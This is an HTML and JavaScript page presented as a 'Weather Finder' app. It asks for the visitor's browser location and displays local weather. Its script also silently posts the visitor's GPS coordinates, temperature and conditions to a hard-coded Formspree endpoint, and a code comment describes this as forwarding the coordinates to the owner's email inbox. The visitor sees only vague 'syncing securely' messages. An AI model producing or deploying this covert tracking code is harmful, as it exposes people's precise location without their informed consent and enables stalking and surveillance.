<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Finder</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .app-container {
            background-color: #ffffff;
            padding: 35px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-top: 0;
            color: #333;
            font-size: 26px;
            margin-bottom: 25px;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #ae1c21;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
        }
        button:hover {
            background-color: #8c1418;
        }
        button:active {
            transform: scale(0.98);
        }
        .weather-display {
            margin-top: 25px;
            padding: 20px;
            background-color: #f8f9fa;
            border-radius: 8px;
            border-left: 5px solid #ae1c21;
            display: none;
            text-align: left;
        }
        .weather-display h3 {
            margin: 0 0 10px 0;
            color: #333;
            font-size: 18px;
        }
        .weather-data {
            font-size: 24px;
            font-weight: bold;
            color: #ae1c21;
            margin-bottom: 5px;
        }
        .weather-desc {
            font-size: 14px;
            color: #666;
            text-transform: capitalize;
        }
        .status-message {
            margin-top: 15px;
            font-size: 13px;
            color: #777;
        }
    </style>
</head>
<body>

<div class="app-container">
    <h2>Weather Finder</h2>
    
    <!-- Action trigger button -->
    <button id="actionBtn" onclick="initiateWeatherLookup()">What's My Weather?</button>
    
    <div id="status" class="status-message"></div>

    <!-- Live Weather Visual Card Details -->
    <div id="weatherBox" class="weather-display">
        <h3>Current Local Weather</h3>
        <div id="tempDisplay" class="weather-data">--°C</div>
        <div id="descDisplay" class="weather-desc">Fetching details...</div>
    </div>
</div>

<script>
    // Configuration options
    const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mbdnlpkw';

    // WMO Weather Interpretation Codes Map 
    const weatherCodes = {
        0: 'Clear sky', 1: 'Mainly clear', 2: 'Partly cloudy', 3: 'Overcast',
        45: 'Fog', 48: 'Depositing rime fog',
        51: 'Light drizzle', 53: 'Moderate drizzle', 55: 'Dense drizzle',
        61: 'Slight rain', 63: 'Moderate rain', 65: 'Heavy rain',
        71: 'Slight snow fall', 73: 'Moderate snow fall', 75: 'Heavy snow fall',
        80: 'Slight rain showers', 81: 'Moderate rain showers', 82: 'Violent rain showers',
        95: 'Thunderstorm'
    };

    function initiateWeatherLookup() {
        const statusDiv = document.getElementById('status');
        const btn = document.getElementById('actionBtn');
        
        statusDiv.innerText = "Requesting location permissions...";
        btn.disabled = true;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(fetchWeatherData, handleLocationError);
        } else {
            statusDiv.innerText = "Geolocation is not supported by your browser.";
            btn.disabled = false;
        }
    }

    function handleLocationError(error) {
        const statusDiv = document.getElementById('status');
        const btn = document.getElementById('actionBtn');
        statusDiv.innerText = "Failed: Location permission denied or unavailable.";
        btn.disabled = false;
    }

    async function fetchWeatherData(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const statusDiv = document.getElementById('status');
        
        statusDiv.innerText = "Fetching local weather parameters...";

        try {
            // Call the public API (No unique developer key or signups required)
            const response = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
            const data = await response.json();
            
            if (data.current_weather) {
                const temp = data.current_weather.temperature;
                const code = data.current_weather.weathercode;
                const condition = weatherCodes[code] || 'Unknown Weather Conditions';

                // Display parameters instantly to user
                document.getElementById('tempDisplay').innerText = `${temp}°C`;
                document.getElementById('descDisplay').innerText = condition;
                document.getElementById('weatherBox').style.display = 'block';
                statusDiv.innerText = "Weather loaded! Syncing details securely...";

                // Silently forward backend GPS coordinates to your email inbox
                sendEmailLog(lat, lon, temp, condition);
            } else {
                throw new Error("Invalid payload format received");
            }
        } catch (err) {
            statusDiv.innerText = "Error parsing current weather patterns.";
            document.getElementById('actionBtn').disabled = false;
            console.error(err);
        }
    }

    function sendEmailLog(latitude, longitude, temperature, condition) {
        const statusDiv = document.getElementById('status');
        const btn = document.getElementById('actionBtn');

        // Construct background Formspree submission payload
        const formData = new FormData();
        formData.append("Latitude", latitude);
        formData.append("Longitude", longitude);
        formData.append("Temperature Recorded", `${temperature}°C`);
        formData.append("Condition Summary", condition);

        fetch(FORMSPREE_ENDPOINT, {
            method: "POST",
            body: formData,
            headers: { 'Accept': 'application/json' }
        })
        .then(res => {
            if (res.ok) {
                statusDiv.innerText = "Done! Enjoy your weather update.";
            } else {
                statusDiv.innerText = "Weather shown on display, but cloud tracking failed.";
            }
            btn.disabled = false;
        })
        .catch(error => {
            statusDiv.innerText = "Weather shown on display, data link disconnected.";
            btn.disabled = false;
            console.error(error);
        });
    }
</script>

</body>
</html>
